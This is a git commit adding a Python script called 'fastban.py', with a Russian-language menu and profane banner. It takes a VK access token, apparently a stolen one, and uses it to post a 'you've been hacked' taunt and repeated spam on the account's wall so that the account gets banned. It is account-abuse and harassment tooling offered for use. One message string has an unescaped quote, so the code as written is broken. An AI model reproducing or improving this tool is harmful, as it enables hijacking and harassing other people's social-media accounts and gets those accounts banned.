9d342ac2bb1db241596b7f59753384e8d529b828
Drag228228 <74857072+Drag228228@users.noreply.github.com>
2020-11-22 13:09:04 +0300

    Add files via upload

---
+++ fastban.py
@@ -0,0 +1,63 @@
+import requests
+import vk_api
+import os
+import time
+from colorama import Fore, Back, Style 
+def fastban():
+    os.system("clear")
+    intro = '''
+\033[32m\033[01m
+   _____ _    ____ _____    ____    _    _   _
+  |  ___/ \  / ___|_   _|  | __ )  / \  | \ | |
+  | |_ / _ \ \___ \ | |____|  _ \ / _ \ |  \| |
+  |  _/ ___ \ ___) || |____| |_) / ___ \| |\  |
+  |_|/_/   \_\____/ |_|    |____/_/   \_\_| \_|
+\033[0m
+      .:Coding-Lab:. .:|ТВОИМ ДРУЗЬЯМ ПИЗДА!!!|:.
+
+'''
+    print(Fore.RED + "\033[1m" + intro)
+    print(Fore.WHITE + """                                  
+[1] WALL-POST-BAN                        
+[2] DEVOLOPERS                          
+[3] EXIT                                 
+
+
+    """)
+    a = input("[Enter number] -> ")
+    if a == "1":
+        try:
+            tok = input("[ACCESS-TOKEN] -> ") 
+            token = vk_api.VkApi(token = tok) 
+            vk = token.get_api()
+            vk.wall.post(message='Fuck You! I'm hacked you.')
+            for var in range(5):
+                time.sleep(3)
+                vk.wall.post(message='Сова никогда не спит')             
+                print(Fore.BLACK + Back.RED + "[log] Сообщение отправленно. Ожидайте пиздеца!")
+            print(Back.BLACK + Fore.WHITE)
+            os.system("clear")
+            fastban()
+        except Exception as er:
+            print('Невалидный токен или страница в бане')
+            fastban()
+    if a == "2":
+        print("""                                  
+ DEVOLOPERS                               
+ TELEGRAM: @cod1ng_lab                    
+ TELEGRAM: @BatyaRimskiy1                  
+ Для выхода в главное меню нажмите Enter   
+
+        """)
+        c = input("-> : ")
+        if c == "1":
+            os.system("clear")
+            fastban()
+        else:
+            os.system("clear")
+            fastban()
+    if a == "3":
+        os.system("exit")
+    else:
+        fastban()
+fastban()
